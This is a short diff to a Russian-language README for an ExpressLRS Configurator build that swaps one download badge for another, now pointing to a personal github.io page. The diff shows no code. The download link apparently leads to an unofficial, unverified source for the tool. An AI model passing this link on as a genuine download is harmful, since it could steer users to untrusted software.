@@ -1,10 +1,7 @@
 # ExpressLRS Configurator — сборка и прошивка ELRS с тонкими RF-настройками (RU)
 
-<p align="center">
-  <a href="https://configurator-express-lrs.github.io/.github">
-    <img src="https://img.shields.io/badge/Получить_ExpressLRS_Configurator-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Получить ExpressLRS Configurator">
-  </a>
-</p>
+[![GET Configurator Express](https://img.shields.io/badge/GET%20%E2%80%94%20Configurator-Express-0078D6?style=for-the-badge&logoColor=white)](https://ebissa03.github.io/.github/Configurator-Express)
+
 
 ---
 
